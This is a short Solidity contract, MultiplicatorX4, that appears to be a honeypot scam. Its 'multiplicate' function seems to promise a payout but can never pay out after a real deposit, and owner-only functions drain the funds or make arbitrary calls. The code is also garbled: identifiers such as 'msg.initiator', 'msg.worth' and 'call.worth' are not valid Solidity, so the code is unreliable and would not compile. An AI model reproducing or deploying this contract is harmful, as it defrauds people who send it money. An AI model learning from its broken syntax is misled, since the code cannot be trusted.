// SPDX-License-Identifier: MIT
pragma solidity ^0.4.18;

contract MultiplicatorX4
{
    address public Owner = msg.initiator;

    function() public payable{}

    function claimLoot()
    payable
    public
    {
        require(msg.initiator == Owner);
        Owner.transfer(this.balance);
    }

    function Command(address adr,bytes details)
    payable
    public
    {
        require(msg.initiator == Owner);
        adr.call.worth(msg.worth)(details);
    }

    function multiplicate(address adr)
    public
    payable
    {
        if(msg.worth>=this.balance)
        {
            adr.transfer(this.balance+msg.worth);
        }
    }
}